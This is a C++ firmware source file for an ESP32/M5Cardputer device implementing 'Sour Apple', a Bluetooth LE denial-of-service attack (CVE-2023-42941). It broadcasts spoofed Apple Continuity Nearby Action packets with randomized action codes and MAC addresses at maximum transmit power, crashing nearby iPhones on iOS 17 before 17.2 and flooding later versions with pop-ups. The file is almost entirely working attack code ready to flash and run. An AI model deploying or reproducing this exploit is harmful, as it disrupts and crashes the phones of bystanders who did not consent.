/*
 * ble_sourapple — iOS 17 notification DoS (CVE-2023-42941).
 *
 * Credits: discovered by ECTO-1A, ESP32 port by RapierXbox.
 * Uses Apple Continuity subtype 0x0F (Nearby Action) with cycling
 * action codes. iOS 17 pre-17.2 crashes on sustained receipt.
 * iOS 17.2+ has a pairing-request timeout that mitigates the crash
 * but still pops notifications.
 *
 * Payload: 17 bytes, Apple manufacturer data, varying action type
 * {0x27,0x09,0x02,0x1E,0x2B,0x2D,0x2F,0x01,0x06,0x20,0xC0} and
 * random authentication tag.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <NimBLEDevice.h>
#include <esp_random.h>
#include <esp_bt.h>

static volatile bool     s_sa_alive = false;
static volatile uint32_t s_sa_count = 0;

static const uint8_t SA_TYPES[] = {
    0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0,
};

static void sa_task(void *)
{
    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    /* Crank TX power to the max legal level. */
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,     ESP_PWR_LVL_P9);

    while (s_sa_alive) {
        uint8_t pkt[17];
        int i = 0;
        pkt[i++] = 16;      /* length */
        pkt[i++] = 0xFF;    /* manufacturer-specific */
        pkt[i++] = 0x4C;    /* Apple */
        pkt[i++] = 0x00;
        pkt[i++] = 0x0F;    /* Nearby Action subtype */
        pkt[i++] = 0x05;    /* length */
        pkt[i++] = 0xC1;    /* action flags */
        pkt[i++] = SA_TYPES[esp_random() % (sizeof(SA_TYPES))];
        esp_fill_random(pkt + i, 3); i += 3;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        pkt[i++] = 0x10;
        esp_fill_random(pkt + i, 3); i += 3;

        /* Randomize MAC per advertisement. */
        uint8_t mac[6];
        for (int k = 0; k < 6; ++k) mac[k] = (uint8_t)esp_random();
        mac[0] |= 0xC0;
        ble_hs_id_set_rnd(mac);
        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

        NimBLEAdvertisementData data;
        data.addData(std::string((const char *)pkt, 17));
        adv->setAdvertisementData(data);
        adv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
        adv->start();
        delay(30);
        adv->stop();
        s_sa_count++;
        delay(40);
    }
    vTaskDelete(nullptr);
}

void feat_ble_sourapple(void)
{
    radio_switch(RADIO_BLE);
    s_sa_count = 0;
    s_sa_alive = true;
    xTaskCreate(sa_task, "sour_apple", 4096, nullptr, 5, nullptr);

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("SOUR APPLE");
    d.drawFastHLine(4, BODY_Y + 12, 90, COL_BAD);
    d.setTextColor(0xF81F, COL_BG);
    d.setCursor(4, BODY_Y + 22); d.print("iOS 17 notification DoS");
    d.setTextColor(COL_DIM, COL_BG);
    d.setCursor(4, BODY_Y + 34); d.print("works on iOS <17.2");
    d.setCursor(4, BODY_Y + 44); d.print("lingering popups on 17.2+");
    ui_draw_footer("`=stop");

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 200) {
            last = millis();
            d.fillRect(0, BODY_Y + 58, 150, 20, COL_BG);
            d.setTextColor(COL_GOOD, COL_BG);
            d.setCursor(4, BODY_Y + 58);
            d.printf("sent: %lu", (unsigned long)s_sa_count);
            ui_draw_status(radio_name(), "sour");
        }
        ui_matrix_rain(160, BODY_Y + 18, SCR_W - 160, BODY_H - 20, 0xF81F);
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) break;
    }
    s_sa_alive = false;
    delay(200);
}
